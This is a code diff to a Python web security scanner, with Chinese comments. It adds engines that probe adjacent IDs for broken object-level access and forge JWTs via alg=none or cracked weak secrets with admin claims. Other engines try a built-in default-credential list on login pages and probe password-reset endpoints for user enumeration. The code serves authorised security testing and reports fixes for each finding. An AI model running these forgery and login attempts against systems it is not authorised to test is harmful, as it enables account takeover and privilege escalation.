@@ -25,7 +25,7 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from vulnclaw.core.logger import logger
 from vulnclaw.core.payload_pool import PayloadPool
 from vulnclaw.core.settings import settings
-from vulnclaw.core.utils import async_get, clean_ai_json
+from vulnclaw.core.utils import async_get, async_post, clean_ai_json
 from vulnclaw.engines.base import BaseEngine
 from typing import Dict, List, Optional, Tuple
 
@@ -150,6 +150,82 @@ class IDOREngine(BaseEngine):
         if re.match(r'^[0-9a-f]{32,64}$', value, re.I):
             return True
         if re.match(r'^[A-Za-z0-9+/=]+$', value) and len(value) >= 16:
+            return True
+        return False
+
+    # ============================================================
+    # A8: 顺序 ID 相邻越权(BOLA)证明 —— 无凭据场景下的轻量双账号替代
+    # 用同一会话访问相邻 ID（id±1 等），若返回属于其它用户的数据则确认越权。
+    # 与 scan_with_roles（需多角色会话）互补：本方法不需要第二个账号即可产出 proof。
+    # ============================================================
+    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
+        from vulnclaw.core.utils import async_get
+        endpoints = kwargs.get("endpoints") or [target]
+        findings: List[Dict] = []
+        for ep in endpoints:
+            if not isinstance(ep, str) or not ep:
+                continue
+            for param, original in self._extract_id_params(ep):
+                mutations = [m for m in self._generate_id_mutations(original)
+                             if m not in ("", None) and m != original]
+                base = await self._idor_fetch(ep, param, original, session, async_get)
+                if base is None:
+                    continue
+                for mv in mutations[:8]:
+                    txt = await self._idor_fetch(ep, param, mv, session, async_get)
+                    if not txt:
+                        continue
+                    if txt.strip() == base.strip():
+                        continue
+                    if self._idor_other_user(base, txt):
+                        findings.append({
+                            'url': self._idor_url(ep, param, mv),
+                            'parameter': param,
+                            'value': original,
+                            'mutated_value': mv,
+                            'type': 'IDOR/BOLA-顺序ID越权',
+                            'severity': 'High',
+                            'ai_verdict': '疑似真实漏洞',
+                            'confidence': 'medium',
+                            'evidence': (
+                                f'同一会话访问 {param}={mv} 返回与 {param}={original} '
+                                f'不同的有效资源，疑似越权访问他人数据'
+                            ),
+                            'recommendation': '服务端校验资源属主关系；使用不可预测引用标识；基于会话的访问控制',
+                            'method': 'idor_adjacency',
+                        })
+                        break
+        return findings
+
+    def _idor_url(self, ep: str, param: str, value: str) -> str:
+        parsed = urlparse(ep)
+        qs = parse_qs(parsed.query)
+        qs[param] = [value]
+        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
+                           parsed.params, urlencode(qs, doseq=True), parsed.fragment))
+
+    async def _idor_fetch(self, ep, param, value, session, async_get) -> Optional[str]:
+        try:
+            status, text, _ = await async_get(
+                self._idor_url(ep, param, value), session=session, timeout=8, no_retry=True)
+            if status >= 500:
+                return None
+            return text or ""
+        except Exception:
+            return None
+
+    def _idor_other_user(self, base: str, txt: str) -> bool:
+        import re as _re
+        # 其它用户的 PII 信号：base 中无，或值与 base 不同
+        for pat in self.SENSITIVE_PATTERNS.values():
+            mb = _re.search(pat, base)
+            mt = _re.search(pat, txt)
+            if mt and (not mb or mt.group(0) != mb.group(0)):
+                return True
+        # 不同的 UUID/对象标识
+        ub = set(_re.findall(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', base, _re.I))
+        ut = set(_re.findall(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', txt, _re.I))
+        if ut and ut != ub:
             return True
         return False
 
@@ -283,7 +359,7 @@ class IDOREngine(BaseEngine):
                 mutations.append(f"{num}a")
                 mutations.append(f"a{num}")
             except:
-                pass
+                logger.debug("suppressed exception (engine audit)")
 
         elif re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', original_id, re.I):
             parts = original_id.split('-')
@@ -315,7 +391,7 @@ class IDOREngine(BaseEngine):
                     if new_encoded != original_id:
                         mutations.append(new_encoded)
             except:
-                pass
+                logger.debug("suppressed exception (engine audit)")
 
         elif re.match(r'^[0-9a-f]{32,64}$', original_id, re.I):
             if original_id[-1].isdigit():
@@ -982,8 +1058,147 @@ class JWTEngine(BaseEngine):
                     'recommendation': '建议在 JWT 中添加 jti 字段或过期时间较短'
                 }
         except Exception:
-            pass
+            logger.debug("suppressed exception (engine audit)")
         return None
+
+
+    # ============================================================
+    # A9: JWT 伪造验证（alg=none / 弱密钥） —— 主动提交伪造 Token，验证服务端是否接受
+    # 不依赖 PyJWT，纯标准库实现（base64url + hmac），环境无第三方库也能跑。
+    # ============================================================
+    @staticmethod
+    def _b64url_encode(data: bytes) -> str:
+        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
+
+    @staticmethod
+    def _b64url_decode(seg: str) -> bytes:
+        pad = "=" * (-len(seg) % 4)
+        return base64.urlsafe_b64decode(seg + pad)
+
+    def _jwt_parts(self, token: str):
+        try:
+            return token.split(".")
+        except ValueError:
+            return None
+
+    def _jwt_forge_none(self, token: str) -> Optional[List[str]]:
+        """alg=none 伪造：alg 改 none、去掉签名；返回常见两种接受形式。"""
+        parts = self._jwt_parts(token)
+        if not parts or len(parts) != 3:
+            return None
+        try:
+            header = json.loads(self._b64url_decode(parts[0]))
+            payload = json.loads(self._b64url_decode(parts[1]))
+        except Exception:
+            return None
+        header["alg"] = "none"
+        eh = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+        ep = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+        # 两种常见接受形式：空签名段 / 完全没有第三段
+        return [f"{eh}.{ep}.", f"{eh}.{ep}"]
+
+    def _jwt_crack(self, token: str) -> Optional[str]:
+        """离线弱密钥爆破：用内置 WEAK_SECRETS 校验 HS* 签名，命中即返回密钥。"""
+        import hmac, hashlib
+        parts = self._jwt_parts(token)
+        if not parts or len(parts) != 3:
+            return None
+        try:
+            header = json.loads(self._b64url_decode(parts[0]))
+        except Exception:
+            return None
+        alg = (header.get("alg") or "").upper()
+        if not alg.startswith("HS"):
+            return None
+        mapping = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+        digestmod = mapping.get(alg)
+        if digestmod is None:
+            return None
+        signing_input = f"{parts[0]}.{parts[1]}".encode()
+        for secret in self.WEAK_SECRETS:
+            mac = hmac.new(secret.encode(), signing_input, digestmod).digest()
+            if self._b64url_encode(mac) == parts[2]:
+                return secret
+        return None
+
+    def _jwt_forge_with_secret(self, token: str, secret: str, claims: Dict) -> Optional[str]:
+        """用爆破到的密钥重签一个提权 Token。"""
+        import hmac, hashlib
+        parts = self._jwt_parts(token)
+        if not parts or len(parts) != 3:
+            return None
+        try:
+            header = json.loads(self._b64url_decode(parts[0]))
+            payload = json.loads(self._b64url_decode(parts[1]))
+        except Exception:
+            return None
+        payload.update(claims)
+        alg = (header.get("alg") or "HS256").upper()
+        mapping = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
+        digestmod = mapping.get(alg, hashlib.sha256)
+        eh = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+        ep = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+        mac = hmac.new(secret.encode(), f"{eh}.{ep}".encode(), digestmod).digest()
+        return f"{eh}.{ep}.{self._b64url_encode(mac)}"
+
+    async def _jwt_accepted(self, ep: str, forged: str, session) -> Optional[bool]:
+        """主动验证：用伪造 Token 访问端点；以垃圾 Token 作对照。
+        若伪造 Token 返回 <400 而垃圾 Token 被拒(401/403)，判定接受伪造。"""
+        try:
+            trash = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.AAAAAA"
+            st_ok, _, _ = await async_get(ep, session=session, timeout=8, no_retry=True,
+                                          headers={"Authorization": f"Bearer {forged}"})
+            st_bad, _, _ = await async_get(ep, session=session, timeout=8, no_retry=True,
+                                           headers={"Authorization": f"Bearer {trash}"})
+            if st_ok < 400 and st_bad in (401, 403):
+                return True
+            if st_ok < 400:  # 弱判定：伪造被接受即可疑
+                return None
+            return False
+        except Exception:
+            return None
+
+    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
+        """A9: 遍历端点，提取响应/头中的 JWT，主动验证 alg=none 与弱密钥伪造是否被接受。"""
+        endpoints = kwargs.get("endpoints") or [target]
+        findings: List[Dict] = []
+        for ep in endpoints:
+            if not isinstance(ep, str) or not ep:
+                continue
+            try:
+                status, text, headers = await async_get(ep, session=session, timeout=8, no_retry=True)
+            except Exception:
+                continue
+            tokens = set(re.findall(self.JWT_PATTERN, text or ""))
+            for hname, hval in (headers or {}).items():
+                if isinstance(hval, str) and ("authorization" in hname.lower() or "cookie" in hname.lower()):
+                    tokens |= set(re.findall(self.JWT_PATTERN, hval))
+            if not tokens:
+                continue
+            for tok in list(tokens)[:5]:
+                for forged_none in (self._jwt_forge_none(tok) or []):
+                    if await self._jwt_accepted(ep, forged_none, session) is True:
+                        findings.append({
+                            'url': ep, 'type': 'JWT-alg=none伪造', 'severity': 'High',
+                            'ai_verdict': '疑似真实漏洞', 'confidence': 'medium',
+                            'evidence': f'端点 {ep} 接受 alg=none 伪造 Token（垃圾 Token 被拒）',
+                            'recommendation': '禁止 alg=none；严格校验签名算法白名单（仅允许预期算法）',
+                            'method': 'jwt_none_forgery',
+                        })
+                        break
+                secret = self._jwt_crack(tok)
+                if secret:
+                    forged_admin = self._jwt_forge_with_secret(
+                        tok, secret, {"admin": True, "role": "admin", "is_admin": True})
+                    if forged_admin and await self._jwt_accepted(ep, forged_admin, session) is True:
+                        findings.append({
+                            'url': ep, 'type': 'JWT-弱密钥伪造', 'severity': 'Critical',
+                            'ai_verdict': '疑似真实漏洞', 'confidence': 'high',
+                            'evidence': f'Token 使用弱密钥 "{secret}" 签名，可重签提权 Token 且被 {ep} 接受',
+                            'recommendation': f'更换强随机密钥（当前 "{secret}" 过弱）；优先使用非对称算法(RS256)',
+                            'method': 'jwt_weak_key_forgery',
+                        })
+        return findings
 
 
 # ============================================================
@@ -1100,7 +1315,7 @@ class OAuthEngine(BaseEngine):
                     })
                     logger.info(f"🎯 发现 OAuth 授权端点: {test_url}")
             except Exception:
-                pass
+                logger.debug("suppressed exception (engine audit)")
 
         for path in self.TOKEN_PATHS:
             test_url = base + path
@@ -1120,7 +1335,7 @@ class OAuthEngine(BaseEngine):
                     })
                     logger.info(f"🎯 发现 OAuth Token 端点: {test_url}")
             except Exception:
-                pass
+                logger.debug("suppressed exception (engine audit)")
 
         return endpoints
 
@@ -1173,7 +1388,7 @@ class OAuthEngine(BaseEngine):
                             'recommendation': '强制校验 redirect_uri 白名单，绑定 client_id'
                         }
             except Exception:
-                pass
+                logger.debug("suppressed exception (engine audit)")
         return None
 
     async def test_state_missing(self, url: str, params: Dict) -> Optional[Dict]:
@@ -1228,7 +1443,7 @@ class OAuthEngine(BaseEngine):
                         'recommendation': '验证请求的 Scope 是否属于客户端允许的范围'
                     }
             except Exception:
-                pass
+                logger.debug("suppressed exception (engine audit)")
         return None
 
     async def test_client_id_swap(self, url: str, params: Dict, session) -> Optional[Dict]:
@@ -1273,7 +1488,7 @@ class OAuthEngine(BaseEngine):
                         'recommendation': '验证 client_id 与回调 URI 的绑定关系'
                     }
             except Exception:
-                pass
+                logger.debug("suppressed exception (engine audit)")
         return None
 
     async def test_race_condition(self, url: str, params: Dict, session) -> Optional[Dict]:
@@ -1572,7 +1787,7 @@ class SessionEngine(BaseEngine):
                     })
                     break
             except:
-                pass
+                logger.debug("suppressed exception (engine audit)")
 
         return findings
 
@@ -1655,7 +1870,7 @@ class SessionEngine(BaseEngine):
                     "recommendation": "设置合理的会话过期时间；注销时强制服务端使会话失效"
                 })
         except Exception:
-            pass
+            logger.debug("suppressed exception (engine audit)")
         return findings
 
 
@@ -1663,6 +1878,327 @@ class SessionEngine(BaseEngine):
 # 导出
 # ============================================================
 
-__all__ = ['IDOREngine', 'JWTEngine', 'OAuthEngine', 'SessionEngine']
+class WeakCredentialEngine(BaseEngine):
+    """弱口令 / 默认凭据检测引擎（CWE-521）
+
+    安全约束（避免退化为无节制爆破）：
+    - 仅对明确识别出的登录端点尝试，端点数量硬上限 MAX_ENDPOINTS；
+    - 字典仅含常见默认凭据与极弱口令，不是大字典暴力破解；
+    - 命中即停止该端点的后续尝试，不再继续尝试其它口令。
+    """
+
+    name = "weak_credential"
+    description = "弱口令/默认凭据检测（CWE-521）"
+
+    LOGIN_PATHS = (
+        "/login", "/signin", "/api/login", "/api/auth/login", "/auth/login",
+        "/admin/login", "/administrator", "/wp-login.php", "/user/login",
+        "/api/v1/login", "/api/signin", "/account/login", "/api/token",
+    )
+
+    # 常见默认凭据与极弱口令（设备/中间件默认账号 + TOP 弱口令）
+    DEFAULT_CREDENTIALS = (
+        ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
+        ("admin", "admin123"), ("admin", "12345678"), ("admin", "1q2w3e4r"),
+        ("admin", "changeme"), ("administrator", "administrator"),
+        ("administrator", "admin"), ("root", "root"), ("root", "toor"),
+        ("root", "123456"), ("test", "test"), ("test", "123456"),
+        ("guest", "guest"), ("user", "user"), ("user", "123456"),
+        ("demo", "demo"), ("sa", "sa"), ("oracle", "oracle"),
+        ("postgres", "postgres"), ("mysql", "mysql"), ("ftp", "ftp"),
+    )
+
+    SUCCESS_HINTS = (
+        "dashboard", "welcome", "logout", "sign out", "token", "jwt",
+        "user_id", "登录成功", "欢迎", "我的账户",
+    )
+    FAILURE_HINTS = (
+        "invalid", "incorrect", "unauthorized", "bad credentials", "wrong password",
+        "login failed", "authentication failed", "错误", "失败", "用户名或密码",
+    )
+
+    MAX_ENDPOINTS = 3
+    TIMEOUT = 6
+
+    async def check(
+        self,
+        url: str,
+        param: str,
+        normal_resp: Tuple[int, str, Dict],
+        parsed_query: str,
+        session,
+        **kwargs
+    ) -> Optional[Dict]:
+        """参数级入口：弱口令需提交登录请求体，统一走 scan() 全局扫描。"""
+        return None
+
+    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
+        """检测目标登录端点是否存在默认凭据/极弱口令。"""
+        findings: List[Dict] = []
+        parsed = urlparse(target)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+        logger.info(f"🔍 [WeakCredential] 检测弱口令/默认凭据: {target}")
+
+        endpoints = await self._discover_login_endpoints(base_url, session)
+        if not endpoints:
+            logger.info("   ℹ️ 未发现登录端点，跳过弱口令检测")
+            return findings
+
+        for url in endpoints[: self.MAX_ENDPOINTS]:
+            hit = await self._try_default_credentials(url, session)
+            if hit:
+                findings.append(hit)
+
+        logger.info(f"   ✅ WeakCredential 完成，发现 {len(findings)} 个问题")
+        return findings
+
+    async def _discover_login_endpoints(self, base_url: str, session) -> List[str]:
+        """探测登录端点：200 需含登录表单特征，401/405 视为 API 认证端点。"""
+        endpoints: List[str] = []
+        for path in self.LOGIN_PATHS:
+            url = base_url.rstrip("/") + path
+            try:
+                resp = await async_get(url, session=session, timeout=self.TIMEOUT, no_retry=True)
+                status = resp[0]
+                text = resp[1] or ""
+            except Exception:
+                continue
+            if status in (401, 405):
+                endpoints.append(url)
+            elif status == 200:
+                lowered = (text or "").lower()
+                if "password" in lowered or "login" in lowered or "登录" in lowered:
+                    endpoints.append(url)
+        return endpoints
+
+    async def _try_default_credentials(self, url: str, session) -> Optional[Dict]:
+        """用默认凭据字典尝试登录，命中即返回 finding（随后停止尝试）。"""
+        base_status, base_text, _ = await self._post_login(
+            url, "__vulnclaw_nouser__", "__vulnclaw_nopass__", session
+        )
+        if base_status is None:
+            return None
+
+        for username, password in self.DEFAULT_CREDENTIALS:
+            status, text, headers = await self._post_login(url, username, password, session)
+            if status is None:
+                continue
+            if self._is_success(status, text, headers, base_status, base_text):
+                return {
+                    "url": url,
+                    "type": "weak_credential_default",
+                    "severity": "Critical" if username in ("admin", "root", "administrator") else "High",
+                    "title": f"默认凭据/弱口令可登录：{username}/{password}",
+                    "description": (
+                        f"登录端点 {url} 接受常见默认凭据 `{username}/{password}`，"
+                        f"攻击者无需破解即可直接接管账户（CWE-521）。"
+                    ),
+                    "remediation": "立即修改默认口令，启用强口令策略、登录失败锁定与多因素认证。",
+                    "recommendation": "修改默认口令并强制首次登录改密；启用 MFA 与失败锁定。",
+                    "parameter": "username/password",
+                    "method": "POST",
+                    "evidence": (
+                        f"POST {url} username={username} -> HTTP {status}"
+                        f"（与失败基线 HTTP {base_status} 不同，且返回会话凭据或成功特征）"
+                    ),
+                    "confidence": "high",
+                    "cvss": 9.8,
+                }
+        return None
+
+    async def _post_login(self, url: str, username: str, password: str, session):
+        """提交登录请求（API 端点优先 JSON，页面端点优先表单，互为回退）。"""
+        payload = {"username": username, "password": password}
+        use_json = any(k in url.lower() for k in ("/api", "/token", "/auth"))
+        attempts = (
+            ({"json": payload}, {"data": payload}) if use_json
+            else ({"data": payload}, {"json": payload})
+        )
+        last = (None, "", {})
+        for kwargs in attempts:
+            try:
+                resp = await async_post(
+                    url, session=session, timeout=self.TIMEOUT, no_retry=True, **kwargs
+                )
+                status = resp[0]
+                text = resp[1] or ""
+                headers = resp[2] if len(resp) > 2 else {}
+                if status not in (404, 405, 415):
+                    return status, text, headers
+                last = (status, text, headers)
+            except Exception:
+                continue
+        return last
+
+    def _is_success(
+        self,
+        status: int,
+        text: str,
+        headers: Dict,
+        base_status: Optional[int],
+        base_text: str,
+    ) -> bool:
+        """判定登录是否成功（相对失败基线 + 会话凭据 + 成功特征三重约束）。"""
+        lowered = (text or "").lower()
+        base_lowered = (base_text or "").lower()
+
+        if any(hint in lowered for hint in self.FAILURE_HINTS):
+            return False
+        if base_lowered and lowered == base_lowered:
+            return False
+        if status in (401, 403):
+            return False
+        if status not in (200, 201, 302):
+            return False
+
+        set_cookie = str((headers or {}).get("Set-Cookie", "")).lower()
+        has_session_credential = any(
+            key in set_cookie for key in ("session", "token", "auth", "jwt", "sid")
+        )
+        has_success_hint = any(hint in lowered for hint in self.SUCCESS_HINTS)
+        if not (has_session_credential or has_success_hint):
+            return False
+
+        # 与失败基线相比需有明显差异（状态不同或响应长度差异显著）
+        if status != base_status:
+            return True
+        return abs(len(text) - len(base_text)) > max(50, int(len(base_text) * 0.2))
+
+
+
+
+class PasswordResetEngine(BaseEngine):
+    """密码重置流程检测（B3/framewok 增量）。
+
+    覆盖：
+    1. 密码重置/忘记密码端点发现（forgot-password, reset-password, /password/reset 等）
+    2. 用户枚举：对已存在/不存在的账号发起密码重置，比对响应差异
+    3. 重置 token 可预测/弱验证：在响应/URL 中发现可预测 token，或重放 token 未失效的证据
+    4. 验证码/速率限制缺失信号：同一重置请求重复提交无阻断提示
+    """
+
+    name = "password_reset"
+    description = "密码重置流程安全检测"
+
+    RESET_ENDPOINTS = [
+        "/forgot-password", "/forgot_password", "/password/reset", "/password-reset",
+        "/reset-password", "/reset_password", "/api/auth/reset", "/api/forgot-password",
+        "/api/v1/auth/forgot-password", "/auth/forgot-password", "/auth/reset-password",
+        "/account/forgot-password", "/account/reset-password",
+    ]
+    # 请求密码重置时的账号参数名
+    ACCOUNT_PARAMS = ["username", "user", "email", "account", "login", "phone"]
+    # 用户枚举响应差异信号
+    ENUM_HINTS_EXIST = ["password reset", "reset link", "sent", "check your email", "验证码已发送", "重置链接已发送", "邮件已发送"]
+    ENUM_HINTS_MISSING = ["not found", "does not exist", "no account", "invalid", "不存在", "未注册", "无此账号", "error", "failed"]
+    # 弱重置 token 特征
+    WEAK_TOKEN_HINTS = ["0000", "1234", "1111", "timestamp", "Math.floor(Date.now", "randomseed"]
+
+    async def discover_endpoints(self, base_url: str, session) -> List[str]:
+        from urllib.parse import urlparse as _up
+        parsed = _up(base_url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        found = []
+        for ep in self.RESET_ENDPOINTS:
+            for u in (base + ep, base + ep + "/"):
+                try:
+                    resp = await async_get(u, session=session, timeout=6, no_retry=True)
+                    if isinstance(resp, tuple):
+                        status, text = resp[0], resp[1]
+                    else:
+                        status, text = resp.status, await resp.text()
+                    if status in (200, 301, 302, 405):
+                        found.append(u)
+                        break
+                except Exception:
+                    continue
+        return found
+
+    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
+        from vulnclaw.config.settings import settings as _st
+        if not _st.password_reset:
+            return []
+
+        findings = []
+        endpoints = await self.discover_endpoints(target, session)
+        if not endpoints:
+            return findings
+        for ep in endpoints[:6]:
+            f = await self._scan_reset_endpoint(ep, session)
+            if f:
+                findings.extend(f)
+        return findings
+
+    async def _scan_reset_endpoint(self, url: str, session) -> List[Dict]:
+        out = []
+        # 1) 用候选账号参数发起重置，尝试做用户枚举差异对比（两批账号，低侵入）
+        probed = []
+        try:
+            base_resp = await self._do_reset(url, "vulnclaw_probe_nonexist_9d2k1", session)
+            body = str(base_resp[1] or "") if base_resp else ""
+            status_none = base_resp[0] if base_resp else 0
+            probed.append((body, status_none))
+        except Exception:
+            probed = []
+        if probed:
+            # 存在明显"不存在"提示 → 响应区分账号存在性 = 用户枚举面
+            got_nonexist_hint = any(h in body for h in self.ENUM_HINTS_MISSING)
+            if got_nonexist_hint:
+                out.append({
+                    "url": url,
+                    "type": "密码重置-用户枚举面",
+                    "severity": "Medium",
+                    "ai_verdict": "中",
+                    "confidence": "medium",
+                    "evidence": "对不存在的账号发起重置返回了明确的不存在提示，攻击者可据此枚举有效账号",
+                    "recommendation": "对存在与不存在的账号返回统一且无差别的提示",
+                })
+        # 2) 重置 token 可预测/弱验证信号（在响应或 Location 中出现弱 token 特征）
+        weak_hits = [h for h in self.WEAK_TOKEN_HINTS if h.lower() in body.lower()]
+        if weak_hits:
+            out.append({
+                "url": url,
+                "type": "密码重置-弱重置令牌特征",
+                "severity": "Medium",
+                "ai_verdict": "中",
+                "confidence": "medium",
+                "evidence": "重置响应中出现可预测/弱令牌特征: " + ", ".join(weak_hits),
+                "recommendation": "使用高强度随机重置令牌，禁止在响应/URL 中回显可预测值",
+            })
+        # 3) 重复请求无阻断/无速率限制信号（两次请求都返回可用状态 = 无验证/限速）
+        if len(probed) == 1:
+            try:
+                second = await self._do_reset(url, "vulnclaw_probe_nonexist_9d2k1", session)
+                if second and probed[0][1] in (200, 302) and second[0] in (200, 302):
+                    out.append({
+                        "url": url,
+                        "type": "密码重置-缺少速率限制/验证",
+                        "severity": "Medium",
+                        "ai_verdict": "中",
+                        "confidence": "medium",
+                        "evidence": "对同一账号连续两次重置请求均返回可用状态，缺少速率限制或验证码校验",
+                        "recommendation": "为密码重置增加图形/短信验证码、失败锁定与速率限制",
+                    })
+            except Exception:
+                logger.debug("suppressed exception (engine audit)")
+        return out
+
+    async def _do_reset(self, url: str, account: str, session):
+        from urllib.parse import urlparse as _up, urlencode
+        parsed = _up(url)
+        # 尝试 POST form；失败则回退 GET 带参数
+        data = {}
+        for p in self.ACCOUNT_PARAMS:
+            data[p] = account
+        try:
+            resp = await async_post(url, data=data, session=session, timeout=8)
+        except Exception:
+            return None
+        if isinstance(resp, tuple):
+            return resp
+        return (resp.status, await resp.text())
+
+
+__all__ = ['IDOREngine', 'JWTEngine', 'OAuthEngine', 'SessionEngine', 'WeakCredentialEngine', 'PasswordResetEngine']
 
 # ===== 文件结束 =====
